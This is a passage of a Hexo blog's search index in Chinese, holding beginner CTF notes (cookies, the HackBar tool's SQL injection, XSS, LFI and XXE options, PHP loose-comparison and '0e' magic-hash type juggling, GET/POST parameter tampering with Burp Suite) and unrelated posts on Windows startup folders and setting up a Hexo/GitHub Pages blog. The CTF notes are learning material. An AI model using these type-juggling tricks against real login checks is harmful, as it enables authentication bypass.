alt="DBYQsS.jpg"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><a href="https://zhuanlan.zhihu.com/p/22396872">https://zhuanlan.zhihu.com/p/22396872</a></p><p><a href="https://www.kancloud.cn/kancloud/http-cookies-explained/48325">https://www.kancloud.cn/kancloud/http-cookies-explained/48325</a></p><p>简单地说，cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie 是纯文本格式，不包含任何可执行的代码。一个 Web 页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web 服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个 cookie，只要这个 cookie 存在并可以，用户就可以自由浏览这个网站的任意页面。再次说明，cookie 只包含数据，就其本身而言并不有害。</p><h2 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h2><p><strong>Encryption**</strong>:对数据进行加密(有多种加密形式)；**<br><strong>Encoding</strong>:各类编码；**<br><strong>SQL</strong>:SQL注入；<br><strong>XSS</strong>:XSS攻击；<br><strong>LFI</strong>:LFI漏洞；<br><strong>XXE*:XXE攻击；:其他选项，包含Jsonify,Uppercase,Lowercase;**<br>*<em>Load URL</em>:加载网址，将网址加载进框，便于修改；</strong><br><strong>Split URL*:切分网址，自动切分，快速找出需要改的地方；**<br>*<em>Execute</em>:执行，相当于F5；</strong><br>*<em>Post data</em>:将要发送的数据填入此处；**<br><strong>Referer*:刷新；<br>*<em>User Agent</em>:用户代理；</strong></p><p>Cookies*:网页cookie;<br>*<em>Clear ALL</em>:清除全部;</p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="学习地址"><a href="#学习地址" class="headerlink" title="学习地址"></a>学习地址</h3><p><a href="https://www.php.cn/php/php-variables.html">https://www.php.cn/php/php-variables.html</a></p><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p><strong>php中有两种比较的符号 == 与 ===</strong></p><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><pre><code class="hljs plain">如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</code></pre><p><strong>这里明确了说如果一个数值和字符串进行比较的时候，会将字符串转换成数值</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span>var_dump(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span>var_dump(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true</span><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//上述代码可自行测试</span></code></pre><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>观察上述代码，<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span> 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是<span class="hljs-number">0</span>自然和<span class="hljs-number">0</span>相等<span class="hljs-symbol">2 </span><span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span> 比较的时候会将<span class="hljs-number">1</span>admin转化成数值,结果为<span class="hljs-number">1</span>，而“admin1“==<span class="hljs-number">1</span> 却等于错误，也就是<span class="hljs-string">&quot;admin1&quot;</span>被转化成了<span class="hljs-number">0</span>,为什么呢？？<span class="hljs-symbol">3 </span><span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e456789&quot;</span>相互比较的时候，会将<span class="hljs-number">0e</span>这类字符串识别为科学技术法的数字，<span class="hljs-number">0</span>的无论多少次方都是零，所以相等</code></pre><p><strong>对于上述的问题我查了php手册</strong></p><pre><code class="hljs cpp">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>并且其数值值在整形的范围之内该字符串被当作<span class="hljs-keyword">int</span>来取值，其他所有情况下都被作为<span class="hljs-keyword">float</span>来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为<span class="hljs-number">0</span>。</code></pre><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>&lt;?php<span class="hljs-symbol">2 </span>$test=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; // $test=<span class="hljs-number">11.5</span>(float)<span class="hljs-symbol">3 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; //$test=-<span class="hljs-number">1299</span>(float)<span class="hljs-symbol">4 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">5 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;//$test=<span class="hljs-number">3</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">6 </span>$test=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;//$test=<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>)<span class="hljs-symbol">7 </span>?&gt;</code></pre><p><strong>所以就解释了”admin1”==1 =&gt;False 的原因</strong></p><p>eg：<strong>在进行弱类型比较时，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</strong></p><pre><code class="hljs awk">var_dump(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e99999&quot;</span>); <span class="hljs-regexp">//</span>true</code></pre><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124162604179.png" alt="image-20201124162604179"></p><h2 id="CTF-wp"><a href="#CTF-wp" class="headerlink" title="CTF wp:"></a>CTF wp:</h2><h5 id="3-get-改数据"><a href="#3-get-改数据" class="headerlink" title="3.get 改数据"></a>3.get 改数据</h5><p>后的/ 有无都可以，但？后面都是参数，？表示与URL区分开</p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124163935858.png" alt="image-20201124163935858"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201123215715570.png" alt="image-20201123215715570"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201123215746483.png" alt="image-20201123215746483"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201123215914938.png" alt="image-20201123215914938"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201123220511840.png" alt="image-20201123220511840"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201123222055181.png" alt="image-20201123222055181"></p><h5 id="4-POST改数据"><a href="#4-POST改数据" class="headerlink" title="4.POST改数据"></a>4.POST改数据</h5><h6 id="1-鼠标不要在空白区域点击，不然会悄悄产生换行符导致长度不一样所以flag不同"><a href="#1-鼠标不要在空白区域点击，不然会悄悄产生换行符导致长度不一样所以flag不同" class="headerlink" title="1.鼠标不要在空白区域点击，不然会悄悄产生换行符导致长度不一样所以flag不同"></a>1.鼠标不要在空白区域点击，不然会悄悄产生换行符导致长度不一样所以flag不同</h6><h6 id="2-用Burp-Suite来传参，不过要把GET改成POST，还要加一行"><a href="#2-用Burp-Suite来传参，不过要把GET改成POST，还要加一行" class="headerlink" title="2.用Burp Suite来传参，不过要把GET改成POST，还要加一行"></a>2.<strong>用Burp Suite来传参，不过要把GET改成POST，还要加一行</strong></h6><pre><code class="hljs isbl"><span class="hljs-variable">Content</span>-<span class="hljs-variable">Type</span>:<span class="hljs-variable"><span class="hljs-class">application</span></span>/<span class="hljs-variable">x</span>-<span class="hljs-variable">www</span>-<span class="hljs-variable">form</span>-<span class="hljs-function"><span class="hljs-title">urlencoded</span>(;<span class="hljs-variable">charset</span>=<span class="hljs-variable">utf</span>-<span class="hljs-number">8</span>)</span></code></pre><p>![img](file:///D:\Relax\pc qq\1245614980\1245614980\Image\C2C\M_@V9DG~<code>J&#123;E</code><a href="mailto:&#55;&#x40;&#84;&#48;&#73;&#x49;&#x5f;&#x59;&#x53;&#52;&#x2e;&#112;&#x6e;&#103;">&#55;&#x40;&#84;&#48;&#73;&#x49;&#x5f;&#x59;&#x53;&#52;&#x2e;&#112;&#x6e;&#103;</a>)</p><p>hackbar:</p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124005036223.png" alt="image-20201124005036223"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124005116193.png" alt="image-20201124005116193"></p><h5 id="5-矛盾"><a href="#5-矛盾" class="headerlink" title="5.矛盾"></a>5.矛盾</h5><p><strong>is_numeric</strong> <strong>—</strong> <strong>检测变量是否为数字</strong></p><p><strong>是数字和数字字符串则返回</strong> TRUE，否则返回FALSE</p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124163747842.png" alt="image-20201124163747842"></p><h6 id="复习HTTP"><a href="#复习HTTP" class="headerlink" title="复习HTTP"></a>复习HTTP</h6><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.aspxfans.com:<span class="hljs-number">8080</span><span class="hljs-regexp">/news/i</span>ndex.asp?boardID=<span class="hljs-number">5</span>&amp;ID=<span class="hljs-number">24618</span>&amp;page=<span class="hljs-number">1</span><span class="hljs-comment">#name</span></code></pre><ol><li>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“<strong>index.asp</strong>”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</li><li>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</li><li><strong>参数部分</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符</li></ol><h5 id="6-web3"><a href="#6-web3" class="headerlink" title="6.web3"></a>6.web3</h5><p>解码</p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124171828760.png" alt="image-20201124171828760"></p><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124171805841.png" alt="image-20201124171805841"></p><h5 id="7-域名解析（可）"><a href="#7-域名解析（可）" class="headerlink" title="7.域名解析（可）"></a>7.域名解析（可）</h5><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124172429240.png" alt="image-20201124172429240"></p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124172510561.png" alt="image-20201124172510561" style="zoom: 67%;"><h5 id="8-停下来"><a href="#8-停下来" class="headerlink" title="8.停下来"></a>8.停下来</h5><p><img src="/.io//Users\12456\AppData\Roaming\Typora\typora-user-images\image-20201124173221050.png" alt="image-20201124173221050"></p><p>多按几次发送就好了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win10软件设置开机启动</title>
    <link href="/2020/11/22/win10%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    <url>/2020/11/22/win10%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="title-win10软件设置开机启动"><a href="#title-win10软件设置开机启动" class="headerlink" title="title: win10软件设置开机启动"></a>title: win10软件设置开机启动</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>我们打开文件夹：</p><p>C:\Users（用户）\Administrator（当前用户名）\AppData\Roaming\Microsoft\Windows\Start Menu\Programs（「开始」菜单）\Programs（程序）\Startup（启动 ）即可找到启动文件夹</p><center> <img src="https://s3.ax1x.com/2020/11/22/D83l80.png"></center><h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在运行中粘贴以下路径回车打开</p><ol><li><p>按键win+r</p></li><li><pre><code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><center> <img src="https://s3.ax1x.com/2020/11/22/D83oM8.png"></center></li></ol>]]></content>
    
    
    <categories>
      
      <category>电脑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>win10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客如何插入图片</title>
    <link href="/2020/11/11/hexo%E5%8D%9A%E5%AE%A2%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/hexo%E5%8D%9A%E5%AE%A2%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <url>/2020/11/11/hexo%E5%8D%9A%E5%AE%A2%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/hexo%E5%8D%9A%E5%AE%A2%E5%A6%82%E4%BD%95%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo博客如何插入图片"><a href="#hexo博客如何插入图片" class="headerlink" title="hexo博客如何插入图片"></a>hexo博客如何插入图片</h1><p>在直白的文章中，图片总是点睛之笔的</p><p>用markdow写的博客，想插入些图片，但是发现不管是直接拖进来也好，还是链接引用，在md文件显示正常，但是不管是本地端hexo s,还是远程域名，博客页面端都无法显示图片，因为照片没有地址/链接，markdown调用的是本地文件夹</p><img src="/.io//Users\12456\Pictures\微信图片_20200826185343.jpg" alt="微信图片_20200826185343" style="zoom: 25%;">   <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s3.ax1x.com/2020/11/11/BvM5kR.jpg" height="120/">  <p>因此，查找万能的Google，选用如下办法</p><h2 id="1-利用图床获得图片链接"><a href="#1-利用图床获得图片链接" class="headerlink" title="1. 利用图床获得图片链接"></a>1. 利用图床获得图片链接</h2><p>进入网站<a href="https://imgchr.com/%EF%BC%88%E6%97%A0%E9%9C%80%E6%A2%AF%E5%AD%90%EF%BC%8C%E5%85%8D%E8%B4%B9">https://imgchr.com/（无需梯子，免费</a>), 上传照片，获得链接</p><blockquote><img src="https://s3.ax1x.com/2020/11/11/BvtdnP.png" border="0"></blockquote><h2 id="2-在markdown文档中插入图片链接"><a href="#2-在markdown文档中插入图片链接" class="headerlink" title="2. 在markdown文档中插入图片链接"></a>2. 在markdown文档中插入图片链接</h2><ul><li>直接复制链接（第二行/第四行）粘贴到文档里时注意删掉    href的&lt;&gt; / 后面括号()里的链接    ，不然点图片是进入链接，不是放大</li></ul><ul><li><h4 id="简单点（中间链接是图片URL"><a href="#简单点（中间链接是图片URL" class="headerlink" title="简单点（中间链接是图片URL)"></a>简单点（中间链接是图片URL)</h4></li></ul><pre><code class="hljs text">&lt;img src=&quot;https://s3.ax1x.com/2020/11/11/BvtQ0K.jpg&quot;&gt;</code></pre><h2 id="3-HTML格式小tips："><a href="#3-HTML格式小tips：" class="headerlink" title="3. HTML格式小tips："></a>3. HTML格式小tips：</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ul><li><p>给图片添加注释，居中，一点小渲染</p><p>在markdown中插入如下html代码</p></li></ul><pre><code class="hljs yaml"><span class="hljs-string">&lt;center&gt;</span>    <span class="hljs-string">&lt;img</span> <span class="hljs-string">style=&quot;border-radius:</span> <span class="hljs-number">0.</span><span class="hljs-string">3125em;</span>    <span class="hljs-attr">box-shadow:</span> <span class="hljs-number">0</span> <span class="hljs-string">2px</span> <span class="hljs-string">4px</span> <span class="hljs-number">0</span> <span class="hljs-string">rgba(34,36,38,.12),0</span> <span class="hljs-string">2px</span> <span class="hljs-string">10px</span> <span class="hljs-number">0</span> <span class="hljs-string">rgba(34,36,38,.08);&quot;</span>     <span class="hljs-string">src=&quot;这里输入图片URL链接&quot;&gt;</span>    <span class="hljs-string">&lt;br&gt;</span>    <span class="hljs-string">&lt;div</span> <span class="hljs-string">style=&quot;color:orange;</span> <span class="hljs-attr">border-bottom:</span> <span class="hljs-string">1px</span> <span class="hljs-string">solid</span> <span class="hljs-comment">#d9d9d9;</span>    <span class="hljs-attr">display:</span> <span class="hljs-string">inline-block;</span>    <span class="hljs-attr">color:</span> <span class="hljs-comment">#999;</span>    <span class="hljs-attr">padding:</span> <span class="hljs-string">2px;&quot;&gt;这里输入注释&lt;/div&gt;</span><span class="hljs-string">&lt;/center&gt;</span></code></pre><h3 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h3><ul><li>html图片在markdown中无缩放选项，需利用html代码来实现，详情见<a href="https://www.w3school.com.cn/tags/att_img_height-width.asp">html教程</a></li><li><strong>简单点</strong>：<strong>在img标签里面只设置宽，不设置高，图片就会等比例缩放。</strong>)(好像改变height/width效果一样的)</li></ul><h1 id="更新-转载他人的办法-不用图床法"><a href="#更新-转载他人的办法-不用图床法" class="headerlink" title="更新(转载他人的办法,不用图床法)"></a>更新(转载他人的办法,不用图床法)</h1><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>(1)在hexo目录下，安装插件：</p><pre><code class="hljs text">npm install hexo-asset-image --save</code></pre><p>(2)在hexo\source 目录下新建一个img文件夹，把图片放置在里面；<br>(3)在xxx.md文件中引用图片：</p><pre><code class="hljs markdown">![<span class="hljs-string">header</span>](<span class="hljs-link"> img/header.jpg</span>)</code></pre><p><img src="/.io//nw.jpg" alt="nw"></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>(1)在全局配置文件（<code>hexo/config.yml</code>)中:</p><pre><code class="hljs yaml"><span class="hljs-attr">post_asset_folder:</span> <span class="hljs-literal">true</span></code></pre><p>做了这个修改的效果是，<br>新建文章post时，会自动生成和文章名相同的文件夹。<br>这个文件夹存放当前文章所用图片的地方。</p><p>以 <code>$ hexo new &quot;文章&quot;</code> 为例，结构如下：</p><pre><code class="hljs css">文章├── <span class="hljs-selector-tag">picture1</span><span class="hljs-selector-class">.jpg</span>├── <span class="hljs-selector-tag">picture2</span><span class="hljs-selector-class">.jpg</span>└── <span class="hljs-selector-tag">picture3</span><span class="hljs-selector-class">.jpg</span>文章<span class="hljs-selector-class">.md</span></code></pre><p>(2)创建文章（在创建的时候，会在hexo/source/_post目录下，生成一个XXX.md文件和一个XXX的文件夹）：</p><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;XXX&quot;</span></code></pre><p>(3)把XXX这个博文需要展示的图片放在XXX文件夹目录下；<br>(4)在XXX.md文件中<em>相对路径</em>引入图片的方式：</p><pre><code class="hljs text">![alt](test.jpg)</code></pre><img src="/.io//nw.jpg" alt="nw" style="zoom: 25%;"><hr><p>完事</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s3.ax1x.com/2020/11/11/BvtQ0K.jpg"> </center>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何搭建个人博客</title>
    <link href="/2020/11/07/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/11/07/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="如何搭建个人博客"><a href="#如何搭建个人博客" class="headerlink" title="如何搭建个人博客"></a>如何搭建个人博客</h1><p>2020-11-07 21:21:33</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BvAsW4.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">博客界面示例</div> </center><h2 id="why博客？"><a href="#why博客？" class="headerlink" title="why博客？"></a>why博客？</h2><ul><li>想先说一下这个古老的东西“博客”，有人说博客已经过时了，现在大多数人都用手机看朋友圈、微博等。是的，但是每当从google或者百度上找到一篇优质的资料我发现是出自个人博客的概率很大。</li><li>曾经问过一个大佬在学习上又没有什么习惯或者技巧，他说“我每当解决一个问题之后都会总结并记录下来”。是的自己也深有体会，每次google半天解决的问题，不做记录的话过一段时间再遇到一样会去google半天去找，可能这就是平常人与大佬们的区别吧。</li><li>最后用在一个个人博客上看到的一句话来开始这篇文章“对任何渴望进步的人来说，写博客/文章/回答对自己的成长帮助都是巨大的。频率和数量不必过分强求，有话要说就写写，没事就歇歇，随意点。<u><em>因为坚持写作的那一刻起，你就已经开始受益。</em></u></li></ul><h2 id="wordpress和hexo哪个更适合用来搭建个人博客？"><a href="#wordpress和hexo哪个更适合用来搭建个人博客？" class="headerlink" title="wordpress和hexo哪个更适合用来搭建个人博客？"></a>wordpress和hexo哪个更适合用来搭建个人博客？</h2><p>目前搭建独立的个人博客有很多种方式，你可以选择购买主机搭建动态博客 - <a href="https://zh-cn.wordpress.com/">WordPress</a>等，也可以使用Github Pages来搭建一个静态的个人博客。</p><h3 id="WordPress-获得个人网站域名来搭建个人博客"><a href="#WordPress-获得个人网站域名来搭建个人博客" class="headerlink" title="WordPress:获得个人网站域名来搭建个人博客"></a>WordPress:获得个人网站域名来搭建个人博客</h3><ul><li>域名是网站的入口，也是网站的第一印象，比如饿了么的官网的域名是：<a href="https://www.ele.me/">https://www.ele.me/</a> ，很是巧妙。常见的有com,cn,net,org等后缀，也有小众的xyz,me,io等后缀，域名是可以购买的，根据你自己的喜好，选择不同的后缀。很多小众奇特的后缀在大陆是没办法备案的，网站也就无法上线。然而使用GitHub托管我们的网站，完全不需要备案，因为托管我们的网站内容的服务器在美国，而且在国内备案流程也比较繁杂，时间需要一周左右。<br>申请域名的地方有很多，域名购买是要花钱的，热门网站：<a href="https://cn.aliyun.com/">阿里云</a><br>如果你已经有了空闲域名就无需购买，直接使用即可。<br>ps:注册一个Github账号，申请学生包可以获得一个免费的顶级域名</li></ul><h3 id="使用-GitHub-Pages-服务搭建博客："><a href="#使用-GitHub-Pages-服务搭建博客：" class="headerlink" title="使用 GitHub Pages 服务搭建博客："></a><strong>使用 GitHub Pages 服务搭建博客：</strong></h3><ol><li>全是静态文件，访问速度快；</li><li>免费方便，不用花钱就可以搭建个人博客，不需要服务器不需要后台；</li><li>可以随意绑定自己的域名；</li><li>数据绝对安全，基于 GitHub 的版本管理，想恢复到哪个历史版本都行；</li><li>博客内容可以轻松打包、转移、发布到其它平台；</li><li>自己可以随性所欲的设计，美观大气上档次；</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><p>有服务器的选择 WP，写文章方便，适合搭好了之后给没有程序基础的人使用。<br>没服务器的，喜欢简洁的使用 Hexo。可以折腾，而且也优雅。</p></li><li><p>我选择了现在很热门的Github Pages + Hexo 的方式来搭建独立的个人博客。<br>wordpress如何搭建见 <a href="https://www.zhihu.com/question/20463581">https://www.zhihu.com/question/20463581</a></p></li></ul><hr><h2 id="用hexo搭建博客大致流程"><a href="#用hexo搭建博客大致流程" class="headerlink" title="用hexo搭建博客大致流程"></a>用hexo搭建博客大致流程</h2><ol><li>有一个 GitHub 账号，没有的话去注册一个；</li><li>安装 node.js、npm，并了解相关基础知识；</li><li>安装 git for windows（或者其它 git 客户端）；</li></ol><h3 id="一-注册GitHub账号"><a href="#一-注册GitHub账号" class="headerlink" title="一 . 注册GitHub账号"></a>一 . 注册GitHub账号</h3><ul><li>进入GitHub官网<a href="github.com/">github.com</a>，新用户注册，<strong>记住</strong>注册的账号名和邮箱，后面会用到。</li><li>ps: 如果是学生，还可以获得GitHub提供的丰厚学生包</li></ul><h4 id="GitHub学生包申请（最好申请）"><a href="#GitHub学生包申请（最好申请）" class="headerlink" title="GitHub学生包申请（最好申请）"></a>GitHub学生包申请（最好申请）</h4><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s3.ax1x.com/2020/11/11/BvZuLR.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">GitHub学生包</div> </center><ul><li><p>为什么要申请GitHub学生包</p><p>Github 学生包包含很多开发者工具，比较吸引的是 DigitalOcean 的 50美元 代金券和 NameCheap 的免费 .me 域名和 Comodo 的 SSL 证书,免费薅羊毛不要白不要</p></li><li><p>申请条件</p><p>年龄大于 13 岁并正在进行可能被授予学位或学历的课程，意味着你从初中开始就可以申请学生包了。你只需要一个学校提供的电子邮箱地址，或有效的学生证件或是任何官方入学证明。</p></li><li><p>申请教程</p><p>这里不多阐述，可以在网上随意的找到，附上一个CSDN里的教程：<a href="https://blog.csdn.net/qq_36667170/article/details/79084166">Github学生包申请</a></p></li></ul><h3 id="二-GitHub创建一个仓库"><a href="#二-GitHub创建一个仓库" class="headerlink" title="二 . GitHub创建一个仓库"></a>二 . GitHub创建一个仓库</h3><ul><li>登录完成之后，在你的主页点击图标 Start a project 创建一个新的仓库，或者右上角的+ New repository来新建仓库</li></ul><blockquote><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BjzgsO.png">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">创建仓库</div> </center></blockquote><ul><li>因为我们是使用 Github Pages 去搭建我们的静态博客，所以版本库的名称是 <strong>你的用户名+.github.io</strong>。<br>如：我的用户名是：luoman666，那么仓库的名字应该是： luoman666.github.io ，<strong>这个是一定不能出错的</strong>。因为之后你将要访问的你的博客地址就是： <a href="https://luoman666.github.io/">https://luoman666.github.io</a> ,这个就是你博客的域名</li></ul><blockquote><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" src="https://s1.ax1x.com/2020/11/11/BvC7NQ.jpg">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">因为我创建过，所以这里是警告⚠</div> </center></blockquote><h2 id="未完待续……-（溜掉嘿嘿）"><a href="#未完待续……-（溜掉嘿嘿）" class="headerlink" title="未完待续……..（溜掉嘿嘿）"></a>未完待续……..（溜掉嘿嘿）</h2>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
